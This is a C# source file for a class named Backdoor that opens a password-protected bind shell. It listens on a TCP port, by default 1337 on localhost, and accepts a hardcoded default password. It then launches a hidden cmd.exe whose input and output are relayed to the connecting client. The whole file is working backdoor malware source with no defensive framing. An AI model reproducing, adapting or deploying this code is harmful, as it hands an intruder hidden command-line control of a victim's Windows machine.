using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace FSBackdoor
{
	public class Backdoor
	{
		private TcpListener listener;                       //ServerSocket object for listening
		private Socket mainSocket;                          //Socket to handle client-server communication
		private int _port;                                   //Port the server listens on
		private String _name;                                //The server name
		private String _password;                            //The server password
		private bool _verbose = true;                        //Displays messages in console if True
		private Process shell;                              //The shell process
		private StreamReader fromShell;
		private StreamWriter toShell;
		private StreamReader inStream;
		private StreamWriter outStream;
		private Thread shellThread;                         //So we can destroy the Thread when the client disconnects

		private static int DEFAULT_PORT = 1337;             //Default port to listen on if one isn't declared
		private static String DEFAULT_NAME = "FSServer";      //Default name of server if one isn't declared
		private static String DEFAULT_PASS = "rerbef";    //Default server password if one isn't declared

		/// <summary>
		/// Initializes a new instance of the <see cref="FSBackdoor.Backdoor"/> class.
		/// </summary>
		public Backdoor()
		{
			_port = DEFAULT_PORT;
			_name = DEFAULT_NAME;
			_password = DEFAULT_PASS;
		}

		/// <summary>
		/// Initializes a new instance of the <see cref="FSBackdoor.Backdoor"/> class.
		/// </summary>
		/// <param name="port">Port</param>
		public Backdoor(int port)
		{
			_port = port;
			_name = DEFAULT_NAME;
			_password = DEFAULT_PASS;
		}

		/// <summary>
		/// Initializes a new instance of the <see cref="FSBackdoor.Backdoor"/> class.
		/// </summary>
		/// <param name="port">Port</param>
		/// <param name="nname">Name</param>
		public Backdoor(int port, String name)
		{                   //Define port and server name
			_port = port;
			_name = name;
			_password = DEFAULT_PASS;
		}

		/// <summary>
		/// Initializes a new instance of the <see cref="FSBackdoor.Backdoor"/> class.
		/// </summary>
		/// <param name="port">Port</param>
		/// <param name="name">Name</param>
		/// <param name="password">Password</param>
		public Backdoor(int port, String name, String password)
		{
			_port = port;
			_name = name;
			_password = password;
		}

		/// <summary>
		/// Initializes a new instance of the <see cref="FSBackdoor.Backdoor"/> class.
		/// </summary>
		/// <param name="port">Port</param>
		/// <param name="name">Name</param>
		/// <param name="password">Password</param>
		/// <param name="verbose">Verbose. If set to <c>true</c> verb.</param>
		public Backdoor(int port, String name, String password, bool verbose)
		{
			_port = port;
			_name = name;
			_password = password;
			_verbose = verbose;
		}


		public void Start()
		{
			try{
			Thread bdoor = new Thread(startServer);
			bdoor.Start ();
			}
			catch(Exception){}
		}

		/// <summary>
		/// The startServer method waits for a connection, checks the password,
		/// and either drops the client or starts a remote shell
		/// </summary>
		void startServer() {
			try {
				if(_verbose)
					Console.WriteLine("Listening on port " + _port);

				//Create the ServerSocket
				IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
				listener = new TcpListener(ipAddress, _port);
				listener.Start();                                   //Stop and wait for a connection
				mainSocket = listener.AcceptSocket();

				if(_verbose)
					Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

				Stream s = new NetworkStream(mainSocket);
				inStream = new StreamReader(s);
				outStream = new StreamWriter(s);
				outStream.AutoFlush = true;

				String checkPass = inStream.ReadLine();

				if(_verbose)
					Console.WriteLine("Client tried password " + checkPass);

				if(!checkPass.Equals(_password)) {                       //if the password is not correct
					if(_verbose)
						Console.WriteLine("Incorrect Password");
					badPass();                                          //Drop the client
					return;
				}

				if(_verbose)
					Console.WriteLine("Password Accepted.");

				shell = new Process();
				ProcessStartInfo p = new ProcessStartInfo("cmd");
				p.CreateNoWindow = true;
				p.UseShellExecute = false;
				p.RedirectStandardError = true;
				p.RedirectStandardInput = true;
				p.RedirectStandardOutput = true;
				shell.StartInfo = p;
				shell.Start();
				toShell = shell.StandardInput;
				fromShell = shell.StandardOutput;
				toShell.AutoFlush = true;
				shellThread = new Thread(new ThreadStart(getShellInput));   //Start a thread to read output from the shell
				shellThread.Start();
				outStream.WriteLine("Welcome to " + _name + " backdoor server.");        //Display a welcome message to the client
				outStream.WriteLine("Starting shell...\n");
				getInput();                                                 //Prepare to monitor client input...
				dropConnection();                                   //When getInput() is terminated the program will come back here

			}
			catch(Exception) { dropConnection(); }
		}

		/// <summary>
		/// The run method handles shell output in a seperate thread
		/// </summary>
		void getShellInput()
		{
			try
			{
				String tempBuf = "";
				outStream.WriteLine("\r\n");
				while ((tempBuf = fromShell.ReadLine()) != null)
				{
					outStream.WriteLine(tempBuf + "\r");
				}
				dropConnection();
			}
			catch (Exception) { /*dropConnection();*/ }
		}

		private void getInput() {
			try {
				String tempBuff = "";                                       //Prepare a string to hold client commands
				while(((tempBuff = inStream.ReadLine()) != null)) {         //While the buffer is not null
					if(_verbose)
						Console.WriteLine("Received command: " + tempBuff);
					handleCommand(tempBuff);                                //Handle the client's commands
				}
			}
			catch(Exception) {}
		}

		private void handleCommand(String com) {        //Here we can catch commands before they are sent
			try {                                       //to the shell, so we could write our own if we want
				if(com.Equals("exit")) {                //In this case I catch the 'exit' command and use it
					outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
					dropConnection();                   //to drop the connection
				}
				toShell.WriteLine(com + "\r\n");
			}
			catch(Exception) { dropConnection(); }
		}

		/// <summary>
		/// The drop connection method closes all connections and
		/// resets the objects to their null states to be created again
		/// I don't know if this is the best way to do it but it seems to
		/// work without issue.
		/// </summary>
		private void badPass()
		{
			inStream.Dispose();
			outStream.Dispose();
			mainSocket.Close();
			listener.Stop();
			return;
		}
		private void dropConnection() {
			try {
				if(_verbose)
					Console.WriteLine("Dropping Connection");
				shell.Close();
				shell.Dispose();
				shellThread.Abort();
				shellThread = null;
				inStream.Dispose();                                 //Close everything...
				outStream.Dispose();
				toShell.Dispose();
				fromShell.Dispose();
				shell.Dispose();
				mainSocket.Close();
				listener.Stop();
				return;
			}
			catch(Exception) {}
		}
//		static void Main(string[] args)
//		{
//			try {
//				Backdoor bd = new Backdoor();
//				if (args.Length == 1)
//					bd = new Backdoor(int.Parse(args[0]));
//				if (args.Length == 2)
//					bd = new Backdoor(int.Parse(args[0]), args[1]);
//				if (args.Length == 3)
//					bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
//				else if (args.Length == 4)
//					bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
//				while (true)
//				{
//					bd.startServer();
//				}
//			}
//			catch(Exception) {}
//
//		}
	}
}